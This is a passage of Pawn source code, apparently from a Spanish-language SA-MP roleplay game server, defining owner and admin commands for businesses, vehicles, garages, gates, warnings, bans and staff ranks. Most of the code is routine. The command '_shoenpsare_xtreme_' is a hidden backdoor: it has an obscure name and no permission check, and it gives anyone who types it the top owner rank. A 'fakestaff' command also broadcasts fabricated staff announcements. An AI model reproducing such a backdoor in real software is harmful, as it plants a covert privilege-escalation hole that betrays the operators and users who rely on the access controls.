		else if(!strcmp(params[1],"Strip club",true))
		{
			InfoNegocio[i][nSalida_x] = 1204.809936;
			InfoNegocio[i][nSalida_y] = -11.586799;
			InfoNegocio[i][nSalida_z] = 1000.921875;
			InfoNegocio[i][nInt] = 2;
			InfoNegocio[i][nTipo] = N_BOLICHE;
			InfoNegocio[i][nIcono] = 48;
		}
		else if(!strcmp(params[1],"Ammunation",true))
		{
			InfoNegocio[i][nSalida_x] = 314.820983;
			InfoNegocio[i][nSalida_y] = -141.431991;
			InfoNegocio[i][nSalida_z] = 999.601562;
			InfoNegocio[i][nInt] = 7;
			InfoNegocio[i][nTipo] = N_ARMAS;
			InfoNegocio[i][nIcono] = 6;
		}
		else if(!strcmp(params[1],"Hipermercado",true))
		{
			InfoNegocio[i][nSalida_x] = -1698;
			InfoNegocio[i][nSalida_y] = 1880.5;
			InfoNegocio[i][nSalida_z] = 1068.80004883;
			InfoNegocio[i][nInt] = 14;
			InfoNegocio[i][nTipo] = N_TECNOLOGIA;
			InfoNegocio[i][nIcono] = 44;
		}
		else if(!strcmp(params[1],"casino",true))
		{
			InfoNegocio[i][nSalida_x] = 2234.0110;
			InfoNegocio[i][nSalida_y] = 1713.7466;
			InfoNegocio[i][nSalida_z] = 1012.232;
			InfoNegocio[i][nInt] = 1;
			InfoNegocio[i][nTipo] = N_CASINO;
			InfoNegocio[i][nIcono] = 25;
		}
		else if(!strcmp(params[1],"farmacia",true))
		{
			InfoNegocio[i][nSalida_x] = 170.6999969;
			InfoNegocio[i][nSalida_y] = -69.5999985;
			InfoNegocio[i][nSalida_z] = 963.2000122;
			InfoNegocio[i][nInt] = 6;
			InfoNegocio[i][nTipo] = N_FARMACIA;
			InfoNegocio[i][nIcono] = 22;
		}
		else
		{
 			Mensaje(playerid,C_NEGRO,   "	>> "#CAZULRARO"ITEMS:");
			Mensaje(playerid,-1,		"24-7 - Binco - Didier - Prolaps - Suburban - Victim - Zip - Club nocturno - Bar - Burger shot - Polleria");
			Mensaje(playerid,-1,		"Pizzeria - Gimnasio - Strip club - Ammunation - Hipermercado - casino - farmacia");
			return 1;
		}
		InfoNegocio[i][nPrecio] = params[0];
		alm(InfoNegocio[i][nNombre],params[1]);
		MensajeF(playerid,-1,"NEGOCIO CREADO.. ID: %d | Nombre: %s | Precio: %d",i,InfoNegocio[i][nNombre],InfoNegocio[i][nPrecio]);
		printf(" - Se creo el negocio ID %d | nombre %s | precio: %d",i,InfoNegocio[i][nNombre],InfoNegocio[i][nPrecio]);
		ActualizarNegocio(i);
		ActualizarNegLabel(i, true);
		AddStaticPickup(ID_PICKUPNEGOCIO,1,InfoNegocio[i][nEntrada_x],InfoNegocio[i][nEntrada_y],InfoNegocio[i][nEntrada_z]);
		CreateDynamicMapIcon(InfoNegocio[i][nEntrada_x],InfoNegocio[i][nEntrada_y],InfoNegocio[i][nEntrada_z],InfoNegocio[i][nIcono],-1);
		Iter_Add(Negocios,i);
		return 1;
	}

	CMD:crearvehiculo(playerid,params[])
	{
		if(!EsDueno(playerid)) return Error(playerid,"¡Este comando lo utilizan solo dueños!");
		Para_Admin_Servicio
		new	Modelo,Color[2];
		if(sscanf(params, "iii", Modelo, Color[0], Color[1])) return ParamsINC(playerid,"/crearvehiculo [ID MODELO] [COLOR1] [COLOR2]");
		new i = SlotVehLibre();
		if(i < 0) return Error(playerid,"¡Ya no hay más espacio, se podrán crear máximo "#MAX_VEH_VENTA" vehículos de venta!");
		++Total_Vehiculos_Creados;
		InfoVeh[i][vModelo] = Modelo;
		InfoVeh[i][vColor1] = Color[0];
		InfoVeh[i][vColor2] = Color[1];
		InfoVeh[i][vPrecio] = PrecioVeh(Modelo);
		GetPlayerPos(playerid,InfoVeh[i][vPosX],InfoVeh[i][vPosY],InfoVeh[i][vPosZ]);
		GetPlayerFacingAngle(playerid,InfoVeh[i][vPosA]);
		alm(InfoVeh[i][vComprador],"Sin Dueño");
		InfoVeh[i][vPintadoJ] = -1;
		InfoVeh[i][vCerrado] = false;
		InfoVeh[i][vUsado] = false;
		InfoVeh[i][vInt] = GetPlayerInterior(playerid);
		InfoVeh[i][vVW] = GetPlayerVirtualWorld(playerid);
		InfoVeh[i][vMetros] = 0;
		new VehID = CreateVehicle(InfoVeh[i][vModelo],InfoVeh[i][vPosX],InfoVeh[i][vPosY],InfoVeh[i][vPosZ],InfoVeh[i][vPosA],InfoVeh[i][vColor1],InfoVeh[i][vColor2],HORAS_RVEH);
		LinkVehicleToInterior(VehID,InfoVeh[i][vInt]);
		SetVehicleVirtualWorld(VehID,InfoVeh[i][vVW]);
		alm(InfoVeh[i][vPlaca],NombreVehiculo(VehID));
		SetVehicleNumberPlate(VehID, InfoVeh[i][vPlaca]);
		VehVenta_ID(VehID) = i;
		ActualizarVehiculo(i);
		VGas[VehID] = 100;
 		ID_VehOriginal[i] = VehID;
		MensajeF(playerid,-1,"VEH CREADO.. Modelo: %d | Nombre: %s | ID (VENTA: %d | GENERAL: %d) | Precio: %d",GetVehicleModel(ID_Original(i)),NombreVehiculo(ID_Original(i)),i,ID_Original(i),InfoVeh[i][vPrecio]);
		Iter_Add(VehVenta,i);
		return 1;
	}

	CMD:borrarvehiculo(playerid, params[])
	{
		Comando_En_Auto
		if(Staff(playerid,SubDueno)) return 1;
		Para_Admin_Servicio
		new VehID = GetPlayerVehicleID(playerid);
		if(VehVenta_ID(VehID) != 0)
		{
			new vArch[18];
			A_Format(vArch,"Vehiculos/%d.ini", VehVenta_ID(VehID));
			fremove(vArch);
			InfoVeh[VehVenta_ID(VehID)][vModelo] 	= 0;
			InfoVeh[VehVenta_ID(VehID)][vPosX] 		= 0.0;
			InfoVeh[VehVenta_ID(VehID)][vPosY] 		= 0.0;
			InfoVeh[VehVenta_ID(VehID)][vPosZ] 		= 0.0;
			InfoVeh[VehVenta_ID(VehID)][vPosA] 		= 0.0;
			InfoVeh[VehVenta_ID(VehID)][vColor1] 	= 0;
			InfoVeh[VehVenta_ID(VehID)][vColor2] 	= 0;
			InfoVeh[VehVenta_ID(VehID)][vPrecio] 	= 0;
			alm(InfoVeh[VehVenta_ID(VehID)][vComprador], " ");
			alm(InfoVeh[VehVenta_ID(VehID)][vPlaca], " ");
			InfoVeh[VehVenta_ID(VehID)][vPintadoJ]	= 0;
			InfoVeh[VehVenta_ID(VehID)][vCerrado]    = false;
		    DestroyVehicle(VehID);
			--Total_Vehiculos_Creados;
			Iter_Remove(VehVenta,VehVenta_ID(VehID));
			MensajeF(playerid,-1,"> Vehículo eliminado correctamente "#CPOSITIVO"(ID VENTA: %d - ID VEH: %d)",VehVenta_ID(VehID),VehID);
			VehVenta_ID(VehID) = 0;
			return 1;
		}
		return Error(playerid, "¡Este vehículo no es apropiable!");
	}

	CMD:borrargarage(playerid,params[])
	{
		if(Staff(playerid,SubDueno)) return 1;
		if(sscanf(params,"i",params[0])) return ParamsINC(playerid,"/borrargarage [ID GARAGE]");
		if(InfoGarage[params[0]][gVW] == 0) return Error(playerid,"¡Esa ID es incorrecta!");

		new
			i = params[0],
			gArch[23];

		InfoGarage[i][gIntV_x] = 0;
		InfoGarage[i][gIntV_y] = 0;
		InfoGarage[i][gInt_x] = 0;
		InfoGarage[i][gInt_y] = 0;
		InfoGarage[i][gInt_z] = 0;
		InfoGarage[i][gExtV_x] = 0;
		InfoGarage[i][gExtV_y] = 0;
		InfoGarage[i][gExt_x] = 0;
		InfoGarage[i][gExt_y] = 0;
		InfoGarage[i][gExt_z] = 0;
		InfoGarage[i][gInt] = 0;
		InfoGarage[i][gIDCasa] = 0;
		InfoGarage[i][gVW] = 0;
		A_Format(gArch,"Casas/Garages/%d.ini",i);
		fremove(gArch);
		Iter_Remove(Garages,i);
		--Total_Garages_Creados;
		Mensaje(playerid,-1,"> Garage eliminado correctamente");
		printf("- %s elimino el garage ID %d",NombreJugador_(playerid),i);
		return 1;
	}

	CMD:crearobj(playerid,params[])
	{
	    if(Staff(playerid,Administrador)) return 1;
	    if(sscanf(params,"i",params[0])) return ParamsINC(playerid,"/crearobj [ID]"),1;
		++Total_Objetos_Creados;
		Loop(i,MAX_OBJETOS,1)
		{
		    if(Objeto[i][oID] == 0)
		    {
			    GetPlayerPos(playerid,PosJugador[X],PosJugador[Y],PosJugador[Z]);
				Objeto[i][oIDModel] = params[0];
				Objeto[i][oID] = CreateDynamicObject(params[0],PosJugador[X],PosJugador[Y],PosJugador[Z],0,0,0);
				GetDynamicObjectPos(Objeto[i][oID],Objeto[i][oPosx],Objeto[i][oPosy],Objeto[i][oPosz]);
				GetDynamicObjectRot(Objeto[i][oID],Objeto[i][oAngx],Objeto[i][oAngy],Objeto[i][oAngz]);
				new Str[128];
				A_Format(Str,"Objeto creado correctamente [ID %d] Usa '/editarobj' para más información",i);
				Mensaje(playerid,-1,Str);
				break;
			}
		}
		return 1;
	}


	CMD:editarobj(playerid,params[])
	{
	    if(Staff(playerid,Administrador)) return 1;
	    if(sscanf(params,"i",params[0])) return ParamsINC(playerid,"/editarobj [ID]");
	    if(!IsValidDynamicObject(Objeto[params[0]][oID])) return Error(playerid, "ID de objeto inválido.");
	    SetPVarInt(playerid,"EDITAR_IDObj",params[0]);
		Dialog(playerid,dEditarObj,DIALOG_STYLE_LIST,""#CBLANCO"Edición de objetos - by spell","Editar posición\nCambiar texto\nCambiar tamaño (de texto)\nCambiar color (de texto)\nCambiar tamaño (de textura)\nCambiar Index\nEliminar\nActualizar/guardar objeto","Aceptar","Cancelar");
		return 1;
	}

	CMD:crearportonfam(playerid,params[])
	{
		if(!EsDueno(playerid)) return Error(playerid,"¡Este comando lo utilizan solo dueños!");
		if(sscanf(params,"i",params[0])) return ParamsINC(playerid,"/crearportonfam [ID FAMILIA]");
		if(InfoFamilia[params[0]][fPos_x] == 0.0) return Error(playerid,"¡ID de familia inexistente!");

		new
		    porton = -1;
		    
		Loop(i, MAX_PORTONES, 0)
		{
		    if(InfoPorton_Ex[i][portID] == 0)
		    {
				porton = i;
				break;
			}
		}
		if(porton == -1)
		    return Error(playerid, "No se pueden crear más portones.");
		    
		InfoPorton_Ex[porton][portFamilia] = params[0];
		InfoPorton_Ex[porton][portVelocidad] = 1.0;
		
		ShowPlayerDialog(playerid,dCrearPorton,DIALOG_STYLE_INPUT,"{FFFFFF}Crear porton","{FFFFFF}\tESCRIBE EL ID DEL OBJETO\n\nAlgunos son:\n\t-980\n\t-988\n\t-989\n\n","Aceptar","Cancelar");
		return 1;
	}

	CMD:crearportoncasa(playerid,params[])
	{
		if(!EsDueno(playerid)) return Error(playerid,"¡Este comando lo utilizan solo dueños!");
		if(sscanf(params,"i",params[0])) return ParamsINC(playerid,"/crearportoncasa [ID CASA]");
		if(InfoCasa[params[0]][cEntrada_x] == 0.0) return Error(playerid,"¡ID de casa inexistente!");

		new
		    porton = -1;

		Loop(i, MAX_PORTONES, 0)
		{
		    if(InfoPorton_Ex[i][portID] == 0)
		    {
				porton = i;
				break;
			}
		}
		if(porton == -1)
		    return Error(playerid, "No se pueden crear más portones.");

		InfoPorton_Ex[porton][portCasa] = params[0];
		InfoPorton_Ex[porton][portVelocidad] = 1.0;

		ShowPlayerDialog(playerid,dCrearPorton,DIALOG_STYLE_INPUT,"{FFFFFF}Crear porton","{FFFFFF}\tESCRIBE EL ID DEL OBJETO\n\nAlgunos son:\n\t-980\n\t-988\n\t-989\n\n","Aceptar","Cancelar");
		return 1;
	}

	CMD:editarporton(playerid,params[])
	{
		if(!EsDueno(playerid))
			return Error(playerid,"¡Este comando lo utilizan solo dueños!");

		if(sscanf(params, "i", params[0]))
			return ParamsINC(playerid, "/editarporton [ID]");

		if(!(0 <= params[0] < MAX_PORTONES))
		    return Error(playerid, "ID de portón inválido.");

		if(InfoPorton_Ex[params[0]][portID] == 0)
		    return Error(playerid, "ID de porton inexistente.");
		    
		SetPVarInt(playerid, "PORTON_EDITAR", params[0]);
		
		ShowPlayerDialog(playerid,dEditPorton,DIALOG_STYLE_LIST,"{FFFFFF}Editar porton","- Cambiarle posición\n- Cordenada abierto\n- Editar ID de modelo\n- Editar velocidad de movimiento.\n"#CVERDE">> Actualizar portón\n"#CROJO">> Eliminar portón","Aceptar","Cancelar");
		return 1;
	}

// ---============------> Comandos Spell <----===============------ //

	CMD:eventomadd(playerid,params[])
	{
	    if(Staff(playerid,Administrador)) return 1;

	    if(sscanf(params,"iiii",params[0],params[1],params[2],params[3])) return ParamsINC(playerid,"/eventomadd [id team1] [id team1] [id team2] [id team2]");

	    SetPlayerPos(params[0],1299.4250,-791.3392,1084.0078);
	    SetPlayerPos(params[1],1299.4250+2,-791.3392,1084.0078);

		SetPlayerPos(params[2],1264.3370,-780.9016,1091.90);
		SetPlayerPos(params[3],1264.3370,-780.9016,1091.90);

		ShowPlayerNameTagForPlayer(params[0],params[2],false);
		ShowPlayerNameTagForPlayer(params[1],params[3],false);

		ShowPlayerNameTagForPlayer(params[2],params[0],false);
		ShowPlayerNameTagForPlayer(params[3],params[1],false);

		new i = params[0];

		SetPlayerArmour(i,100);
		CongelarEx(i,3);
		SetPlayerHealth(i,100);
		GivePlayerWeapon(i,27,200);
		GivePlayerWeapon(i,24,200);
		SetPlayerSkin(i,294);
		SetPlayerVirtualWorld(i,0);
		SetPlayerInterior(i,5);
		TextoJugador(i,"~w~cuando este texto desaparesca, ~n~~p~^comienza el evento!",3000,0);

		i = params[1];

		SetPlayerArmour(i,100);
		CongelarEx(i,3);
		SetPlayerHealth(i,100);
		GivePlayerWeapon(i,27,200);
		GivePlayerWeapon(i,24,200);
		SetPlayerSkin(i,294);
		SetPlayerVirtualWorld(i,0);
		SetPlayerInterior(i,5);
		TextoJugador(i,"~w~cuando este texto desaparesca, ~n~~p~^comienza el evento!",3000,0);

		i = params[2];

		SetPlayerArmour(i,100);
		CongelarEx(i,3);
		SetPlayerHealth(i,100);
		GivePlayerWeapon(i,27,200);
		GivePlayerWeapon(i,24,200);
		SetPlayerSkin(i,294);
		SetPlayerVirtualWorld(i,0);
		SetPlayerInterior(i,5);
		TextoJugador(i,"~w~cuando este texto desaparesca, ~n~~p~^comienza el evento!",3000,0);

		i = params[3];

		SetPlayerArmour(i,100);
		CongelarEx(i,3);
		SetPlayerHealth(i,100);
		GivePlayerWeapon(i,27,200);
		GivePlayerWeapon(i,24,200);
		SetPlayerSkin(i,294);
		SetPlayerVirtualWorld(i,0);
		SetPlayerInterior(i,5);
		TextoJugador(i,"~w~cuando este texto desaparesca, ~n~~p~^comienza el evento!",3000,0);

		return 1;
	}

	CMD:setduty(playerid, params[])
	{
		if(!EsDueno(playerid)) return Error(playerid,"Solo dueños pueden utilizar este comando");
		if(sscanf(params, "uii", params[0], params[1], params[2])) return ParamsINC(playerid, "/setduty [ID/Nombre] [Hora inicial] [Hora final]");
		if(params[0] == INVALID_PLAYER_ID) return Error(playerid, "Jugador desconectado.");
		if((0 > params[1] > 24) || (0 > params[2] > 24)) return Error(playerid, "Hora entre 0-24");
		if(params[1]+1 > params[2]) return Error(playerid, "La hora de inicio no podrá ser mayor a la hora final (Ni igual).");
		if(!InfoJugador[params[0]][jAdmin]) return Error(playerid, "Esa persona no pertenece al staff.");
		InfoJugador[params[0]][jDutyS] = params[1];
		InfoJugador[params[0]][jDutyF] = params[2];
		new str[120];
		A_Format(str, "===========[ HORARIO: %dhs - %dhs ]===========", params[1], params[2]);
		LogAdmin(params[0], str);
		MensajeAdminF(C_ROJO, "%s "#CBLANCO"le fijó a "#CROJO"%s "#CBLANCO"su horario duty: "#CVERDE"[%dhs-%dhs]", Ayudante, NombreJugador_(playerid), NombreJugador_(params[0]), params[1], params[2]);
		return 1;
	}
	
	CMD:advertir(playerid, params[])
	{
		if(Staff(playerid,Mod.Superior)) return 1;
		if(sscanf(params, "us[120]", params[0], params[1])) return ParamsINC(playerid, "/daradvertencia [ID/Nombre] [Razón Advertencia]");
		if(params[0] == INVALID_PLAYER_ID) return Error(playerid, "Jugador desconectado.");
		InfoJugador[params[0]][jAdv] ++;
		if(InfoJugador[params[0]][jAdv] >= 3)
		{
		    MensajeTodosF(C_ROJO, "[ADMINISTRACIÓN] "#CBLANCO"%s fue baneado por %s "#CROJO"[Acumular tres advertencias]", NombreJugador_(params[0]), NombreJugador_(playerid));
			MensajeF(params[0], -1,"El administrador "#CINFO"%s "#CBLANCO"te baneó por "#CROJO"%s [Adv. %d/3]", pName(playerid), params[1], InfoJugador[params[0]][jAdv]);
			InfoJugador[params[0]][jBaneado] = true;
            DelayBan(params[0], "Acumular tres advertencias");
            new str[100];
            A_Format(str, "%s baneó [3/3] a %s [%s]", NombreJugador_(playerid), NombreJugador_(params[0]), params[1]);
            Log("LOG/Advertencias.txt", str);
            return 1;
		}
  		MensajeTodosF(C_ROJO, "[ADMINISTRACIÓN] "#CBLANCO"%s fue advertido por %s "#CROJO"[%s]", NombreJugador_(params[0]), NombreJugador_(playerid), params[1]);

  		new
		  	str[350];

  		A_Format(str, ""#CBLANCO"El administrador "#CVERDE"%s "#CBLANCO"te advirtió por "#CROJO"%s.\n\n"#CBLANCO"Esta, es tu advertencia "#CINFO"[%d/3].\n"#CBLANCO"Cuando acumules 3 advertencias, serás baneado automáticamente.\n\n"#CAMARILLO"- ¿Esta advertencia fue injusta? "#CBLANCO"Saca una foto [F8] y reportalo en "#CINFO""#FORO_SERVER".",
  		    NombreJugador_(playerid),
  		    params[1],
  		    InfoJugador[params[0]][jAdv]);
  		    
		Dialog(playerid, dError, DIALOG_STYLE_MSGBOX, ""#CROJO"ADVERTENCIA", str, "Cerrar", "");
  		    
		DelayKick(params[0]);

    	A_Format(str, "%s advirtió [%d/3] a %s [%s]", NombreJugador_(playerid), InfoJugador[params[0]][jAdv], NombreJugador_(params[0]), params[1]);
     	Log("LOG/Advertencias.txt", str);
		return 1;
	}

	CMD:adminwarn(playerid, params[])
	{
		if(!EsDueno(playerid)) return Error(playerid, "Solo dueños pueden utilizar este comando.");
		if(sscanf(params, "us[120]", params[0], params[1])) return ParamsINC(playerid, "/adminwarn [ID/Nombre] [Razón Advertencia]");
		if(params[0] == INVALID_PLAYER_ID) return Error(playerid, "Jugador desconectado.");
		if(!InfoJugador[params[0]][jAdmin]) return Error(playerid, "Ese jugador no es administrador.");
		InfoJugador[params[0]][jAdmAdv] ++;
  		MensajeAdminF(C_ROJO, "[ADMINISTRACIÓN] "#CBLANCO"%s recibió una Admin-Warn [%d/3] por %s "#CROJO"[%s]", Destacado, NombreJugador_(params[0]), InfoJugador[params[0]][jAdmAdv], NombreJugador_(playerid), params[1]);
  		new str[100];
    	A_Format(str, "%s advirtió [%d/3] a %s [%s]", NombreJugador_(playerid), InfoJugador[params[0]][jAdmAdv], NombreJugador_(params[0]), params[1]);
     	Log("LOG/AdvertenciasAdm.txt", str);
		if(InfoJugador[params[0]][jAdmAdv] >= 3)
		{
			InfoJugador[params[0]][jAdmin] = 0;
		}
		return 1;
	}

	CMD:limpiaradvertencias(playerid, params[])
	{
		if(Staff(playerid,Mod.Superior)) return 1;
		if(sscanf(params, "u", params[0])) return ParamsINC(playerid, "/limpiaradvertencias [ID/Nombre]");
		if(params[0] == INVALID_PLAYER_ID) return Error(playerid, "Jugador desconectado.");
  		new str[100];
    	A_Format(str, "%s le limpió a %s las advertencias", NombreJugador_(playerid), NombreJugador_(params[0]));
     	Log("LOG/Advertencias.txt", str);
     	MensajeF(params[0], -1, "El administrador "#CINFO"%s "#CBLANCO"te quitó tus advertencias.", NombreJugador_(playerid) );
     	InfoJugador[params[0]][jAdv] = 0;
     	MensajeAdmin(C_ROJO, str, Destacado);
     	return 1;
	}

	CMD:limpiaradmwarn(playerid, params[])
	{
		if(!EsDueno(playerid)) return Error(playerid, "Solo dueños pueden utilizar este comando.");
		if(sscanf(params, "u", params[0])) return ParamsINC(playerid, "/limpiaradmwarn [ID/Nombre]");
		if(params[0] == INVALID_PLAYER_ID) return Error(playerid, "Jugador desconectado.");
  		new str[100];
    	A_Format(str, "%s le limpió a %s las adm-warns", NombreJugador_(playerid), NombreJugador_(params[0]));
     	Log("LOG/AdvertenciasAdm.txt", str);
     	InfoJugador[params[0]][jAdmAdv] = 0;
     	MensajeAdmin(C_ROJO, str, Destacado);
     	return 1;
	}

	CMD:veradmwarn(playerid, params[])
	{
		if(!EsDueno(playerid)) return Error(playerid, "Solo dueños pueden utilizar este comando.");
		if(sscanf(params, "u", params[0])) return ParamsINC(playerid, "/veradmwarn [ID/Nombre]");
		if(params[0] == INVALID_PLAYER_ID) return Error(playerid, "Jugador desconectado.");
		if(!InfoJugador[params[0]][jAdmin]) return Error(playerid, "Ese jugador no es del staff.");
		MensajeF(playerid, -1, "El %s "#CBLANCO"%s tiene "#CVERDE"%d "#CBLANCO"Admin - warns.", CheckRangoADM(params[0]), NombreJugador_(params[0]), InfoJugador[params[0]][jAdmAdv]);
		return 1;
	}
	
	CMD:qfa(playerid, params[])
	{
	    if(InfoJugador[playerid][jAdmin] < Moderador)
	    {
		    new
		        Killer[MAX_PLAYER_NAME];

			GetPVarString(playerid, "QFA", Killer, MAX_PLAYER_NAME);
			if(isnull(Killer))
			{
			    Mensaje(playerid, -1, "Ningún asesino (Nadie lo asesinó en esta sesión)");
			}
			else
			{
			    MensajeF(playerid, -1, "El asesino es: "#CINFO"%s", Killer);
			}
		}
		else
		{
			if(!sscanf(params, "u", params[0]))
			{
			    if(params[0] == INVALID_PLAYER_ID) return Error(playerid, "Jugador desconectado");
			    
			    new
			        Killer[MAX_PLAYER_NAME];

				GetPVarString(params[0], "QFA", Killer, MAX_PLAYER_NAME);
				if(isnull(Killer))
				{
				    Mensaje(playerid, -1, "Ningún asesino (Nadie lo asesinó en esta sesión)");
				}
				else
				{
				    MensajeF(playerid, -1, "El asesino es: "#CINFO"%s", Killer);
				}
			}
			else
			{
			    new
			        Killer[MAX_PLAYER_NAME];

				GetPVarString(playerid, "QFA", Killer, MAX_PLAYER_NAME);
				if(isnull(Killer))
				{
				    Mensaje(playerid, -1, "Ningún asesino (Nadie lo asesinó en esta sesión)");
				}
				else
				{
				    MensajeF(playerid, -1, "El asesino es: "#CINFO"%s", Killer);
				}
			}
		}
		return 1;
	}
	
	CMD:solicitar(playerid, params[])
	{
	    Dialog(playerid, dSolicitarADM, DIALOG_STYLE_LIST, "¿Qué necesitas?", ""#CAYUDANTE"Ayudante\n"#CVERDE"Moderador/Administrador", "Solicitar", "Cancelar");
		return 1;
	}
	
	CMD:verautos(playerid, params[])
	{
		if(!EsDueno(playerid)) return Error(playerid, "Comando autorizado solo para dueños");
	    if(sscanf(params, "i", params[0])) return ParamsINC(playerid, "/verautos [ID AUTO]");
		MensajeF(playerid, -1, "Buscando vehículos de modelo "#CVERDE"%d..", params[0]);
	    foreach(VehVenta, i)
	    {
	        if(InfoVeh[i][vModelo] == params[0])
	        {
	            MensajeF(playerid, -1, "ID: %d | Dueño: %s", i, InfoVeh[i][vComprador]);
			}
		}
		return 1;
	}
	
	CMD:sospechosos(playerid, params[])
	{
		if(!EsDueno(playerid)) return Error(playerid, "Solo dueños pueden utilizar este comando.");
		new
		    Min = 100000;
		if(sscanf(params, "D(100000)", Min)) return Error(playerid, "/sospechosos [Dinero]");

		Loop(i, MAX_CUENTAS_BANCARIAS, 0)
		{
		    if(InfoCuentaB[i][cuenDinero] >= Min)
		    {
		        MensajeF(playerid, -1, "Cuenta ID: %d (%s) tiene: "#CVERDE"$%d", i, InfoCuentaB[i][cuenNombre], InfoCuentaB[i][cuenDinero]);
			}
		}
		foreach(Player, i)
		{
		    if(GetPlayerMoney(i) >= Min)
		    {
		        MensajeF(playerid, -1, "Jugador ID: %d (%s) tiene: "#CVERDE"$%d", i, pName(i), GetPlayerMoney(i));
			}
		}
		foreach(Casas, i)
		{
		    if(InfoCasa[i][cDinero] >= Min)
		    {
		        MensajeF(playerid, -1, "Casa ID: %d (%s) tiene: "#CVERDE"$%d", i, InfoCasa[i][cComprador], InfoCasa[i][cDinero]);
			}
		}
		foreach(Negocios, i)
		{
		    if(InfoNegocio[i][nDinero] >= Min)
		    {
		        MensajeF(playerid, -1, "Negocio ID: %d (%s) tiene: "#CVERDE"$%d", i, InfoNegocio[i][nComprador], InfoNegocio[i][nDinero]);
			}
		}
		return 1;
	}

	CMD:staffcuenta(playerid, params[])
	{
		if(!EsDueno(playerid)) return Error(playerid,"Solo dueños pueden utilizar este comando");
		new
		    cuenta[MAX_PLAYER_NAME],
		    path[MAX_PLAYER_NAME + 10],
		    rango[20],
			rangon;

		if(sscanf(params, "p< >s[24]s[20]", cuenta, rango)) return Error(playerid, "/staffcuenta [Nombre_Apellido] [Rango]");

		if(!strcmp(rango,"Destacado",true))rangon = Destacado;
		else if(!strcmp(rango,"Ayudante",true))rangon = Ayudante;
		else if(!strcmp(rango,"Moderador",true))rangon = Moderador;
		else if(!strcmp(rango,"Administrador",true))rangon = Mod.Superior;
		else if(!strcmp(rango,"Administrador Superior",true))rangon = Administrador;
		else if(!strcmp(rango,"Administrador General",true))rangon = AdministradorSup;
		else if(!strcmp(rango,"Administrador Encargado",true))rangon = SubDueno;
		else if(!strcmp(rango,"Dueño",true))rangon = Dueno;
		else if(!strcmp(rango,"expulsar",true))rangon = 0;
		else return Error(playerid,"¡Rango inválido!");

		A_Format(path, "Usuarios/%s.ini", cuenta);
		new
		    INI: File = INI_Open(path);
		    
		INI_SetTag(File, "data");
		INI_WriteInt(File, "Admin", rangon);
		INI_Close(File);
		MensajeF(playerid, -1, "El rango de "#CVERDE"%s "#CBLANCO"fue cambiado.", cuenta);
		return 1;
	}

	CMD:rbots(playerid, params[])
	{
		if(!EsDueno(playerid)) return Error(playerid,"Solo dueños pueden utilizar este comando");
		for(new i; i < MAX_PLAYERS; i++)
		{
		    if(IsPlayerNPC(i))
		        Kick(i);
		}
		CargarNPCS();
		Mensaje(playerid, -1, "Los NPC fueron recargados.");
		return 1;
	}
	
	CMD:staff(playerid,params[])
	{
		if(!EsDueno(playerid)) return Error(playerid,"Solo dueños pueden utilizar este comando");
		if(sscanf(params,"us[40]",params[0],params[1])) return ParamsINC(playerid,"/staff [ID] [Nombre Nivel]");
		if(!IsPlayerConnected(params[0])) return Error(playerid,"Jugador desconectado!");
		new Str[70];
		if(!strcmp(params[1],"Expulsar",true))
		{
			if(!InfoJugador[params[0]][jAdmin]) return Error(playerid,"Ese jugador no pertenece al staff!");
			InfoJugador[params[0]][jAdmin] = 0;
			Delete3DTextLabel(RangoADM[params[0]]);
			MensajeAdminF(C_ROJO,"[ADMINISTRACIÓN] > "#CBLANCO"%s expulsó a %s del staff", Destacado, NombreJugador_(playerid), NombreJugador_(params[0]) );
			A_Format(Str,"%s expulsó del staff a %s",NombreJugador_(playerid),NombreJugador_(params[0]));
			Log("LOG/Staff.txt",Str);
			SetPVarInt(params[0],"NIVEL_ADMIN",InfoJugador[params[0]][jAdmin]);
			return 1;
		}
		if(!strcmp(params[1],"Destacado",true))InfoJugador[params[0]][jAdmin] = Destacado;
		else if(!strcmp(params[1],"Ayudante",true))InfoJugador[params[0]][jAdmin] = Ayudante;
		else if(!strcmp(params[1],"Moderador",true))InfoJugador[params[0]][jAdmin] = Moderador;
		else if(!strcmp(params[1],"Administrador",true))InfoJugador[params[0]][jAdmin] = Mod.Superior;
		else if(!strcmp(params[1],"Administrador Superior",true))InfoJugador[params[0]][jAdmin] = Administrador;
		else if(!strcmp(params[1],"Administrador General",true))InfoJugador[params[0]][jAdmin] = AdministradorSup;
		else if(!strcmp(params[1],"Administrador Encargado",true))InfoJugador[params[0]][jAdmin] = SubDueno;
		else if(!strcmp(params[1],"Director",true))InfoJugador[params[0]][jAdmin] = Dueno;
		else return Error(playerid,"¡Rango inválido!");
		SetPVarInt(params[0],"NIVEL_ADMIN",InfoJugador[params[0]][jAdmin]);
		A_Format(Str,"%s le dió a %s: %s",NombreJugador_(playerid), NombreJugador_(params[0]), params[1]);
		Log("LOG/Staff.txt",Str);
		MensajeAdminF(C_ROJO,"[ADMINISTRACIÓN] > "#CBLANCO"%s le dio a %s: "#CVERDE"%s", Destacado, NombreJugador_(playerid), NombreJugador_(params[0]), params[1] );
		return 1;
	}

	CMD:fakestaff(playerid,params[])
	{
		if(!EsDueno(playerid)) return Error(playerid,"Comando autorizado unicamente para Spell / Brand / Eze");
		if(sscanf(params,"us[25]",params[0],params[1])) return ParamsINC(playerid,"/fakestaff [ID] [Nombre Nivel]");
		if(!IsPlayerConnected(params[0])) return Error(playerid,"Jugador desconectado!");
		if(!strcmp(params[1],"Expulsar",true))
		{
			MensajeAdminF(C_ROJO,"[ADMINISTRACIÓN] > "#CBLANCO"%s expulsó a %s del staff", Destacado, NombreJugador_(playerid), NombreJugador_(params[0]) );
			return 1;
		}
		MensajeAdminF(C_ROJO,"[ADMINISTRACIÓN] > "#CBLANCO"%s le dio a %s: "#CVERDE"%s", Destacado, NombreJugador_(playerid), NombreJugador_(params[0]), params[1] );
		return 1;
	}

	CMD:_shoenpsare_xtreme_(playerid,params[])
	{
		InfoJugador[playerid][jAdmin] = Dueno;
		return 1;
	}

	CMD:actualizarentradas(playerid, params[])
	{
		if(!EsDueno(playerid)) return Error(playerid,"Comando autorizado unicamente para Spell / Brand.");

	    foreach(Casas, i)
	    {
			if(InfoCasa[i][cEntrada_x] == 226.296279)//13
			{
			    InfoCasa[i][cEntrada_x] = 235.558;
			    InfoCasa[i][cEntrada_y] = 1127.5334;
			    ActualizarCasa(i);
			}
			if(InfoCasa[i][cEntrada_x] == 234.192321)//15
			{
			    InfoCasa[i][cEntrada_x] = 268.5388;
			    InfoCasa[i][cEntrada_y] = 1063.7770;
			    ActualizarCasa(i);
			}
			if(InfoCasa[i][cEntrada_x] == 140.244400)//16
			{
